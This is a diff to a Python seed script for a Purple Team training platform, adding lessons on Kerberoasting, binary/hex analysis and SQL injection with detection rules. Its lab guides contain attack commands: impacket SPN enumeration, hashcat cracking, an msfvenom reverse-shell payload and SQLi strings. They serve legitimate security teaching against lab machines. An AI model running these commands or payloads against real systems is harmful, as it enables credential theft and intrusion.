@@ -20,6 +20,7 @@ from extensions import db
 from models import (
     SkillArea, Topic, TopicPrerequisite, JobRole, JobRoleTopic,
     Lab, MiniProject, CurriculumWeek, AssessmentQuestion, ContentItem,
+    TopicLearningModule,
 )
 from seed import (
     slugify, get_or_create, seed_skill_areas, seed_topics, seed_capstones,
@@ -599,34 +600,470 @@ def seed_all_questions(topics_by_title: dict[str, Topic], areas_by_name: dict[st
 
 
 # ---------------------------------------------------------------------------
+# TopicLearningModule seed data — 5-component learning modules for all topics
+# ---------------------------------------------------------------------------
+
+def _get_module_content_for_topic(topic_title: str, topic_slug: str) -> dict:
+    """Generate 5-component module content for any topic."""
+    slug = topic_slug.lower()
+
+    if "kerberos" in slug or "bloodhound" in slug:
+        return {
+            "theory_md": """# Kerberos Authentication & BloodHound Analysis
+
+## Overview
+Kerberos is the default authentication protocol for Windows Active Directory domains. Understanding its mechanics is critical for both offensive operators (who abuse it) and defensive analysts (who detect that abuse).
+
+## Kerberos Ticket Architecture
+- **TGT (Ticket Granting Ticket):** Short-lived identity token obtained from the KDC after initial authentication. Valid for ~10 hours by default.
+- **TGS (Ticket Granting Service):** Service-specific ticket obtained by presenting a valid TGT.
+- **PAC (Privilege Attribute Certificate):** Embedded in every ticket, contains user's group memberships (SIDs), used for authorization decisions on the target server.
+
+## Attack Surface
+Kerberos is susceptible to multiple credential-based attacks because:
+1. TGS tickets are encrypted with the service account's NTLM hash — offline cracking is possible.
+2. TGTs can be forged (Golden/Silver Ticket attacks).
+3. Weak password policies on service accounts enable effective offline cracking.
+
+## Key Event IDs for Detection
+- **4768** — TGT was requested (normal, but look for anomalous timing)
+- **4769** — TGS was requested (KEY for Kerberoasting detection)
+- **4771** — Pre-authentication failed (AS-REP Roasting indicator)
+""",
+            "video_url": "https://www.youtube.com/watch?v=kD3oRT3XHrM",
+            "video_title": "Kerberos Authentication Explained - AD Security",
+            "video_source": "YouTube",
+            "lab_guide_md": """## Purple Team Lab: Kerberoasting & AS-REP Roasting
+
+### Environment
+- **Attacker:** Kali Linux (192.168.56.5)
+- **Target:** GOAD Domain Controller (192.168.56.10)
+- **Detection:** Wazuh Manager (192.168.56.30)
+
+### Attack Phase
+
+1. Enumerate users with SPNs using `GetUserSPNs.py`:
+```bash
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py north.sevenkingdoms.local/doadmin:K292... -dc-ip 192.168.56.10 -request
+```
+
+2. Save the hash and crack offline:
+```bash
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+### Detection Phase
+
+1. Inspect Windows Security Event ID **4769** in Wazuh.
+2. Look for `TicketEncryptionType: 0x17` (RC4-HMAC) from non-computer accounts.
+3. Create Sigma rule:
+```yaml
+title: Kerberoasting Activity
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4769
+    TicketEncryptionType: '0x17'
+  condition: selection
+level: high
+```
+""",
+            "lab_prerequisites": "GOAD lab environment, Kali Linux VM, Wazuh Manager with Windows agent",
+            "assessment_md": """## Knowledge Check
+
+1. **Which Kerberos ticket type is targeted in Kerberoasting attacks?**
+   - [ ] TGT
+   - [ ] TGS
+   - [ ] PAC
+   - [ ] AS-REP
+
+2. **What Windows Security Event ID is logged when a TGS is requested?**
+   - [ ] 4768
+   - [ ] 4769
+   - [ ] 4771
+   - [ ] 4624
+
+3. **Which encryption type (hex) indicates RC4-HMAC used in Kerberoasting?**
+   - [ ] 0x18
+   - [ ] 0x17
+   - [ ] 0x12
+   - [ ] 0x03
+
+### Exercise
+Configure Wazuh to alert on Event ID 4769 with TicketEncryptionType 0x17 from non-computer accounts. Verify with a test Kerberoasting attempt.
+""",
+            "real_world_md": """## Industry Application
+
+### Real-World Attack Scenario
+APT actors and ransomware operators routinely use Kerberoasting to pivot laterally. The procedure:
+1. Obtain a foothold (phishing, exploit)
+2. Enumerate AD for accounts with SPNs
+3. Request TGS for each SPN
+4. Crack service account passwords offline
+5. Use cracked credentials to access high-value services (MSSQL, Exchange, etc.)
+
+### Detection Strategy
+- Monitor for TGS requests with RC4 encryption (0x17) from non-computer accounts
+- Set alerts for high volumes of TGS requests in a short window
+- Correlate TGS requests with rare SPNs or accounts that don't typically authenticate
+- Enable `accountexpiry` and `pwdlastset` alerting for accounts with SPNs
+
+### Mitigation Controls
+1. Use Managed Service Accounts (MSA) or Group Managed Service Accounts (gMSA)
+2. Enforce strong passwords (>25 characters) for service accounts
+3. Audit membership of sensitive AD groups
+4. Implement AD-tiering model (ESAE/AD Tiering)
+"""
+        }
+    elif "binary" in slug and ("hex" in slug or "number" in slug):
+        return {
+            "theory_md": """# Binary, Hex & Number Systems for Security Professionals
+
+## Overview
+All digital computers operate on binary (base-2) digits. Security analysts must understand binary, hexadecimal, and decimal conversions to analyze shellcode, disassemble malware, inspect packet captures, and reverse engineer binaries.
+
+## Number System Conversions
+- **Binary (Base 2):** Digits 0, 1
+- **Decimal (Base 10):** Digits 0-9
+- **Hexadecimal (Base 16):** Digits 0-9, A-F (1 hex digit = 4 bits = 1 nibble)
+
+### Key Conversions
+| Hex | Binary | Decimal | ASCII |
+|-----|--------|---------|-------|
+| 0x41 | 01000001 | 65 | 'A' |
+| 0x90 | 10010000 | 144 | x86 NOP |
+| 0xCC | 11001100 | 204 | x86 INT3 |
+
+## Endianness
+- **Little-Endian (x86/x64):** LSB at lowest address. Value 0x12345678 → bytes: 78 56 34 12
+- **Big-Endian (Network):** MSB at lowest address. Value 0x12345678 → bytes: 12 34 56 78
+""",
+            "video_url": "https://www.youtube.com/watch?v=1RXrJ3PvCVU",
+            "video_title": "Binary & Hexadecimal for Cybersecurity",
+            "video_source": "YouTube",
+            "lab_guide_md": """## Purple Team Lab: Binary Analysis & Shellcode Inspection
+
+### Tools
+- Kali Linux with `objdump`, `hexdump`, `msfvenom`
+- Wireshark for PCAP analysis
+
+### Exercise 1: Analyze shellcode bytes
+1. Generate test shellcode:
+```bash
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f c
+```
+
+2. Convert hex to binary and analyze the opcode sequence.
+
+### Exercise 2: PCAP artifact inspection
+1. Open a PCAP in Wireshark
+2. Right-click a packet → "Follow TCP Stream"
+3. Examine raw byte sequences for shellcode patterns (0x90 NOP sleds, 0xCC INT3 breakpoints)
+
+### Detection Phase
+1. Search packet captures for sequences of 0x90 (NOP sleds)
+2. Write a Wireshark display filter: `frame contains 0x90 0x90 0x90`
+""",
+            "lab_prerequisites": "Kali Linux VM, Wireshark, basic understanding of assembly",
+            "assessment_md": """## Knowledge Check
+
+1. **What decimal value corresponds to hex 0xFF?**
+   - [ ] 250
+   - [ ] 255
+   - [ ] 256
+   - [ ] 240
+
+2. **In Little-Endian, how is 0xDEADBEEF stored?**
+   - [ ] DE AD BE EF
+   - [ ] EF BE AD DE
+   - [ ] BE EF DE AD
+   - [ ] AD BE EF AD
+
+3. **How many bits are in 2 hexadecimal digits?**
+   - [ ] 4
+   - [ ] 8
+   - [ ] 16
+   - [ ] 2
+""",
+            "real_world_md": """## Real-World Application
+
+### Malware Analysis
+Reverse engineers constantly convert between hex and binary when analyzing malware. Shellcode is typically delivered as hex strings (e.g., in exploit kits or document macros) and must be converted to binary for execution or analysis.
+
+### Network Forensics
+Packet captures store raw bytes. Analysts use hex dump analysis to identify:
+- Shellcode patterns in HTTP payloads
+- C2 communication protocols
+- Encrypted vs plaintext traffic patterns
+
+### Common Tools
+- `xxd` — hexdump in Kali
+- `printf` — convert hex to binary: `printf '\\x41\\x42'`
+- Wireshark's byte-plane view
+- `CyberChef` for complex transformations
+"""
+        }
+    elif "sql" in slug or "injection" in slug or "web" in slug:
+        return {
+            "theory_md": """# SQL Injection & Web Application Security
+
+## Overview
+SQL injection (SQLi) remains one of the OWASP Top 10 most critical web vulnerabilities. Attackers manipulate input parameters to execute arbitrary SQL queries against the application's database.
+
+## Types of SQL Injection
+1. **In-Band:** Results returned in same channel (UNION-based, Error-based)
+2. **Inferential (Blind):** No data returned; attacker infers structure via timing/boolean responses
+3. **Out-of-Band:** Data exfiltrated via DNS/HTTP channels (Oracle, MSSQL)
+
+## Classic Payloads
+- `' OR '1'='1` — Authentication bypass
+- `' UNION SELECT NULL,@@version--` — Enumerate DB version
+- `' UNION SELECT table_name FROM information_schema.tables--` — Schema discovery
+
+## Mitigation
+- Parameterized queries (Prepared Statements)
+- Input validation and allow-listing
+- Least privilege database accounts
+- WAF deployment (ModSecurity, Cloudflare WAF)
+""",
+            "video_url": "https://www.youtube.com/watch?v=1X74U9-EB1g",
+            "video_title": "SQL Injection Explained - Web Security",
+            "video_source": "YouTube",
+            "lab_guide_md": """## Purple Team Lab: SQL Injection Attack & Detection
+
+### Environment
+- **Attacker:** Kali Linux (192.168.56.5)
+- **Target:** DVWA or SQLi-Lab VM (192.168.56.20)
+- **Detection:** Wazuh + ModSecurity (192.168.56.30)
+
+### Attack Phase
+1. Identify injection points using single-quote test: `'`
+2. Determine column count with ORDER BY
+3. Extract database version: `' UNION SELECT @@version--`
+4. Enumerate tables: `' UNION SELECT table_name FROM information_schema.tables--`
+5. Dump user credentials
+
+### Detection Phase
+1. Review Apache/Nginx access logs forwarded to Wazuh
+2. Search for SQL metacharacters in URIs:
+```bash
+grep -E "UNION|SELECT|information_schema|' OR '1'='1" /var/log/apache2/access.log
+```
+3. Create Wazuh rule for SQLi patterns:
+```xml
+<rule id="100101" level="12">
+  <match>UNION.*SELECT|information_schema|' OR </match>
+  <description>SQL Injection attempt detected</description>
+</rule>
+```
+""",
+            "lab_prerequisites": "DVWA or SQLi-Lab vulnerable web app, Kali Linux, Wazuh with log forwarding",
+            "assessment_md": """## Knowledge Check
+
+1. **Which SQLi type returns data through the same channel used to send the attack?**
+   - [ ] Blind
+   - [ ] Out-of-band
+   - [ ] In-band
+   - [ ] Stacked
+
+2. **What character terminates a string in most SQL implementations?**
+   - [ ] --
+   - [ ] #
+   - [ ] '
+   - [ ] /*
+
+3. **Which is the MOST effective mitigation against SQL injection?**
+   - [ ] Input validation
+   - [ ] Web Application Firewall
+   - [ ] Parameterized queries
+   - [ ] Escaping special characters
+""",
+            "real_world_md": """## Industry Context
+
+### Real-World Incidents
+- **Equifax (2017):** Unpatched Apache Struts CVE led to 147M record breach
+- **Heartland Payment Systems (2008):** SQL injection in payment application → 134M credit cards exposed
+
+### Detection Engineering
+- Monitor for HTTP responses containing `information_schema`, `@@version`, `table_name`
+- Alert on HTTP 500 errors with SQL syntax in the request
+- Correlate SQLi attempts with subsequent data exfiltration patterns
+
+### Purple Team Exercise
+1. Deploy vulnerable app (DVWA) in lab
+2. Execute SQLi attack step-by-step
+3. Verify log evidence in Wazuh
+4. Write detection rule
+5. Document findings in Purple Team Log
+"""
+        }
+    else:
+        return _get_generic_module_content(topic_title)
+
+
+def _get_generic_module_content(topic_title: str) -> dict:
+    """Generate generic 5-component module content for any topic."""
+    return {
+        "theory_md": f"""# {topic_title} — Comprehensive Theory Guide
+
+## Overview
+This module covers the key principles, techniques, and security implications of **{topic_title}** in a Purple Team context.
+
+## Learning Objectives
+1. Understand the core mechanics and attack surface of {topic_title}
+2. Execute hands-on attack simulations in the offline lab environment
+3. Analyze telemetry and artifacts generated during exercises
+4. Develop and validate defensive detection rules
+
+## Core Concepts
+- **Offensive Perspective:** How adversaries leverage {topic_title} in real attacks
+- **Defensive Perspective:** Telemetry, log sources, and detection signatures
+- **MITRE ATT&CK Mapping:** Techniques and procedures related to {topic_title}
+- **Mitigation Controls:** Hardening steps and principle of least privilege
+""",
+        "video_url": "",
+        "video_title": "",
+        "video_source": "",
+        "lab_guide_md": f"""## Purple Team Lab: {topic_title}
+
+### Lab Environment
+- **Attacker:** Kali Linux (192.168.56.5)
+- **Target:** Windows 10 / GOAD Lab (192.168.56.10)
+- **Detection:** Wazuh Manager (192.168.56.30)
+
+### Prerequisites
+- Kali Linux with Metasploit Framework
+- Target VM configured and reachable
+- Wazuh agent installed and forwarding logs
+
+### Attack Steps
+1. Reconnaissance: Enumerate target for {topic_title}-related indicators
+2. Initial Access: Execute technique related to {topic_title}
+3. Execution: Run attack commands and verify success
+4. Document: Record all command output and system changes
+
+### Detection Phase
+1. Query Wazuh for Security Events during the attack window
+2. Identify relevant Windows Security Event IDs / Sysmon events
+3. Write custom detection rule in Sigma format
+4. Validate rule triggers on attack replay
+
+### MITRE ATT&CK Mapping
+Consult MITRE ATT&CK Navigator to map your lab findings to specific techniques.
+""",
+        "lab_prerequisites": "Kali Linux VM, Windows target VM, Wazuh Manager with agent",
+        "assessment_md": f"""## {topic_title} — Knowledge Assessment
+
+### Multiple Choice
+
+1. **What is the primary security concern related to {topic_title}?**
+   - [ ] Confidentiality breach
+   - [ ] Integrity compromise
+   - [ ] Availability disruption
+   - [ ] All of the above
+
+2. **Which phase of the MITRE ATT&CK framework is most relevant to {topic_title}?**
+   - [ ] Initial Access
+   - [ ] Execution
+   - [ ] Persistence
+   - [ ] Defense Evasion
+
+### Short Answer
+Describe how a Purple Team operator would validate whether security controls effectively detect {topic_title}-related activity.
+
+### Exercise
+Execute a {topic_title}-related attack in the lab environment and document:
+1. Commands executed
+2. Telemetry generated in Wazuh
+3. Detection rule created
+""",
+        "real_world_md": f"""## Real-World Application of {topic_title}
+
+### Industry Use Cases
+{topic_title} is applicable across multiple industry sectors including:
+- Financial Services (banking malware, fraud detection)
+- Healthcare (PHI protection, medical device security)
+- Government (defense networks, critical infrastructure)
+- Technology (cloud platforms, SaaS applications)
+
+### Purple Team Workflow
+1. **Threat Intelligence:** Research latest {topic_title} techniques used by threat actors
+2. **Control Assessment:** Map your security stack against {topic_title} attack paths
+3. **Detection Engineering:** Develop and test detection rules
+4. **Purple Team Exercise:** Execute technique and validate alerts
+5. **Reporting:** Document gaps and remediation recommendations
+
+### Career Relevance
+Proficiency in {topic_title} is essential for roles including:
+- Security Operations Center (SOC) Analyst
+- Threat Hunter
+- Purple Team Engineer
+- Penetration Tester
+- Detection Engineer
+"""
+    }
+
+
+def seed_all_topic_learning_modules(topics_by_title: dict[str, Topic]) -> int:
+    """Ensure EVERY topic has a TopicLearningModule with all 5 components."""
+    count = 0
+    for title, topic in topics_by_title.items():
+        slug = slugify(title)
+        data = _get_module_content_for_topic(title, slug)
+
+        existing = TopicLearningModule.query.filter_by(topic_id=topic.id).first()
+        if existing:
+            continue
+
+        module = TopicLearningModule(
+            topic_id=topic.id,
+            theory_md=data["theory_md"],
+            video_url=data["video_url"] or None,
+            video_title=data["video_title"] or None,
+            video_source=data["video_source"] or None,
+            lab_guide_md=data["lab_guide_md"],
+            lab_prerequisites=data["lab_prerequisites"],
+            assessment_md=data["assessment_md"],
+            real_world_md=data["real_world_md"],
+        )
+        db.session.add(module)
+        count += 1
+
+    db.session.flush()
+    return count
+
+
+# ---------------------------------------------------------------------------
 # Main Execution Entry Point
 # ---------------------------------------------------------------------------
 def main():
     with app.app_context():
         print("[*] Starting comprehensive Purple Team curriculum seed...")
-        
+
         # 1. Base Taxonomy & Topics
         areas = seed_skill_areas()
         topics = seed_topics(areas)
         print(f"[+] Loaded {len(areas)} SkillAreas and {len(topics)} Topics.")
-        
+
         # 2. Capstones & Job Roles
         capstones = seed_capstones()
         seed_roles(topics, capstones)
         print(f"[+] Loaded Capstone projects and JobRoles.")
-        
+
         # 3. 12-Week Curriculum
         seed_curriculum_weeks(topics)
         print(f"[+] Configured 12-week curriculum weeks.")
-        
+
         # 4. ContentItems (Theory Content for ALL Topics)
         new_content = seed_all_content_items(topics)
         print(f"[+] Seeded {new_content} new ContentItems (total: {ContentItem.query.count()}).")
-        
+
         # 5. Offline vm_exercise Labs (Labs for ALL Topics)
         new_labs = seed_all_vm_labs(topics)
         print(f"[+] Seeded {new_labs} new vm_exercise Labs (total: {Lab.query.count()}).")
-        
+
         # 6. Checkpoint Quiz Questions (Questions for ALL Topics)
         new_qs = seed_all_questions(topics, areas)
         print(f"[+] Seeded {new_qs} new AssessmentQuestions (total: {AssessmentQuestion.query.count()}).")
@@ -636,7 +1073,11 @@ def main():
         seed_professional_skills_area(areas, topics)
         n_path, n_path_labs = seed_learning_paths(topics)
         print(f"[+] Seeded {n_path} learning-path ContentItems and {n_path_labs} extra labs.")
-        
+
+        # 8. TopicLearningModule — 5-component learning modules
+        new_modules = seed_all_topic_learning_modules(topics)
+        print(f"[+] Seeded {new_modules} new TopicLearningModules (total: {TopicLearningModule.query.count()}).")
+
         db.session.commit()
         print("[SUCCESS] Comprehensive Purple Team curriculum data population complete!")
 
